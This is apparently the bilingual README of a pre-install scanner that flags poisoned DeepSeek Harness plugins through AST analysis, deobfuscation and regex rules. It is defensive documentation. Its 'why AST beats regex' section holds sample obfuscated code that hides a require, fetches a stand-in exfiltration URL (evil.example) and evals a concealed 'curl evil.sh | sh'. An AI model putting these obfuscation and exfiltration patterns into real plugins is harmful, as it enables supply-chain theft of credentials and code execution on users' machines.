# dsh-poison-guard

[![CI](https://github.com/zoahdev/dsh-poison-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/zoahdev/dsh-poison-guard/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Release](https://img.shields.io/badge/release-v0.2.0-58a6ff.svg)](https://github.com/zoahdev/dsh-poison-guard/releases)

Pre-install supply-chain **poison scanner** for DeepSeek Harness plugins. It is
not a toy regex grep: it runs three layers on every plugin before you `dsh plugin add` it —

1. **AST analysis** via [NodeSecure JS-X-Ray](https://github.com/NodeSecure/js-x-ray)
   (the SAST used by NodeSecure CLI): variable tracing, dynamic-import resolution,
   obfuscator detection, `eval`/`Function`/`vm` sinks, `data-exfiltration`,
   `serialize-environment`, unsafe shell commands, and more.
2. **Deobfuscation decoder** that unpacks `atob()`, `Buffer.from(..., "base64"/"hex")`,
   `String.fromCharCode(...)`, and `\xNN` / `\uNNNN` escapes, then re-scans the decoded
   strings for hidden credentials, URLs, and shell commands.
3. **Regex heuristics** as a fallback for obvious literals, non-code files, and
   install-time scripts (`prepare` / `postinstall` / `install` / `preinstall`).

## The honest threat model

No static tool can catch **all** poisoning. Detecting arbitrary malicious behavior in
arbitrary code is undecidable (Rice's theorem); a determined attacker can always craft
an obfuscation this scanner cannot see through. What this tool does is make the cheap,
high-volume attacks — hidden exfiltration URLs, obfuscated `require("child_process")`,
`eval` of base64 blobs, `process.env` harvests, `.ssh` reads, install-time `curl ... | sh` —
visible to someone who would never find them by reading source. It is **defense-in-depth,
not a security boundary**.

The real boundary is the harness sandbox: keep untrusted plugins in `workspace-write`,
never `danger-full-access`. The last layer is provenance: prefer verified, maintained,
clearly-authored plugins.

## What it detects

| Severity | Examples |
| --- | --- |
| HIGH | `ast/data-exfiltration`, `ast/unsafe-import` (obfuscated require), `ast/unsafe-stmt` (eval/Function/vm), `ast/unsafe-command`, `deobfuscated-secret`, `deobfuscated-key`, `deobfuscated-command`, `exfil-combo`, credential references, private-key paths |
| MEDIUM | `ast/serialize-environment`, `ast/shady-link`, `ast/sql-injection`, `ast/monkey-patch`, `ast/prototype-pollution`, `deobfuscated-url`, network egress, `child_process`, install-time scripts |
| LOW | `ast/encoded-literal`, `ast/short-identifiers`, `ast/unsafe-regex`, `ast/crypto.weak-algorithm`, `env-read`, base64 obfuscation |

Rules are prefixed by layer: `ast/*` (JS-X-Ray), `deobfuscated-*` (decoder),
`install-script*` (manifest), and unprefixed (regex fallback).

## Usage

```sh
# human-readable verdict
dsh-poison-guard scan ./some-plugin

# machine-readable (for CI gates)
dsh-poison-guard scan ./some-plugin --json

# install into a profile (then the agent gains a `plugin_scan` tool)
dsh plugin --profile web add github:zoahdev/dsh-poison-guard
```

Exit code: `0` = CLEAN, `1` = at least one finding (wire it as a CI gate).

### Example

```text
🔴 MALICIOUS  8 high / 5 medium / 4 low finding(s)
engine: AST(js-x-ray) + deobfuscation + regex | 1 source file(s), 3 AST warning(s), 3 decoded fragment(s)

[HIGH] ast/unsafe-import  index.js:6
       obfuscated or untraceable import (require/import of a computed value)
[HIGH] deobfuscated-url  index.js:3
       decoded obfuscated URL: https://evil.example/exfil
[HIGH] exfil-combo  (whole plugin):0
       reads credentials/secrets AND makes network requests - the classic exfiltration shape
```

### CI gate

```yaml
- run: pnpm install --frozen-lockfile
- run: dsh-poison-guard scan ./my-plugin --json
```

The scanner is synchronous and dependency-light at runtime (AST engine is pure
JavaScript, no native modules).

## Why AST + deobfuscation beats a regex scanner

A regex scanner misses everything below because there is no literal string to match:

```js
const lib = Buffer.from("6673", "hex").toString()      // "fs"
const fs = require(lib)                                  // -> ast/unsafe-import

const target = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWw=") // "https://evil.example/exfil"
await fetch(target)                                      // -> deobfuscated-url

const cmd = String.fromCharCode(99,117,114,108)          // "curl"
eval("execSync('" + cmd + " evil.sh | sh')")             // -> deobfuscated-command + ast/unsafe-stmt
```

## Limitations

- Static only — does not execute the plugin or observe runtime behavior.
- Obfuscation can be made undecidable; stronger obfuscators (e.g. `javascript-obfuscator`
  with string-array + control-flow flattening) may still hide the payload.
- The AST layer is tuned to `aggressive` sensitivity for maximum visibility; a benign
  plugin that does real `eval`/`child_process` work will also be flagged.
- No sandbox policy is enforced here; pair it with the harness sandbox.

## Development

```sh
pnpm install --frozen-lockfile
pnpm typecheck
pnpm build
pnpm test
```

MIT license. Community template — not an official DeepSeek product.

---

# dsh-poison-guard（中文）

DeepSeek Harness 插件的**安装前投毒扫描器**。不是正则 grep，而是在 `dsh plugin add` 之前跑三层检测：

1. **AST 分析**（[NodeSecure JS-X-Ray](https://github.com/NodeSecure/js-x-ray)，NodeSecure CLI 同款 SAST）：变量追踪、动态 import 解析、混淆器识别、`eval`/`Function`/`vm`、数据外发、`process.env` 序列化、危险 shell 命令等。
2. **反混淆解码器**：解开 `atob()`、`Buffer.from(...,"base64"/"hex")`、`String.fromCharCode(...)`、`\xNN`/`\uNNNN` 转义，再对解出来的字符串二次扫描隐藏的密钥、URL、shell 命令。
3. **正则兜底**：覆盖明显字面量、非代码文件、以及 `prepare`/`postinstall`/`install`/`preinstall` 安装脚本。

## 老实说边界

任何静态工具都无法拦住**所有**投毒（Rice 定理，不可判定）。它拦住的是大量低成本攻击：隐藏的外发 URL、混淆的 `require("child_process")`、base64 `eval`、`process.env` 收割、读 `.ssh`、安装脚本 `curl ... | sh`。它是纵深防御，不是安全边界。真正的边界是 harness 沙箱：未验证插件永远别开 `danger-full-access`；最后一层是来源信誉。

## 用法

```sh
dsh-poison-guard scan ./some-plugin
dsh-poison-guard scan ./some-plugin --json   # 接 CI 门禁
dsh plugin --profile web add github:zoahdev/dsh-poison-guard
```

退出码：`0` = CLEAN，`1` = 有发现。装进 dsh 后，agent 会多一个 `plugin_scan` 工具，可扫任意插件目录。

## 为什么比纯正则强

正则抓不到下面这些（因为没有可直接匹配的字面量）：

```js
const lib = Buffer.from("6673", "hex").toString()  // "fs"
const fs = require(lib)                            // -> ast/unsafe-import
const target = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWw=")
await fetch(target)                                // -> deobfuscated-url
```

MIT 许可。社区模板，非 DeepSeek 官方产品。
